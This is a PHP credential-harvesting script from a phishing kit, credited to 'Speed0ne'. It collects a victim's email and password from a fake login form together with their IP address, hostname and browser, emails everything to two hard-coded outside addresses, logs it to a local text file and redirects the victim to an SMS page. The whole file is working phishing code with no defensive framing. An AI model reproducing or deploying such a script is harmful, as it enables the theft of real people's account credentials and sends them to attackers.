<?php
$emailresult="freeborne@netcourrier.com,zaz.loze@yahoo.com";
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message  = "===================***************===================\n";
$message .= "Email                  : ".$_POST['zip']."\n";
$message .= "Pass                : ".$_POST['cpp']."\n";
$message .= "=====================================================\n";
$message .= "+-------------------------+ IP Info +-------------------------+\n";
$message .= "Date                          : $date\n";
$message .= "IP                            : $ip\n";
$message .= "Hostname                      : $hostname\n";
$message .= "UserAgent                     : $useragent\n";
$message .= "=====================================================\n";
$message  .= "-----------+ Created By Speed0ne +----------------\n";
$rnessage  = "$message\n";
$subject = "Email - $ip";
$headers = "From: Skitiwi <smtp@ifastnet1.com>";
mail($emailresult,$subject,$message,$headers);

header("Location: sms.html");
$txt = fopen('rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>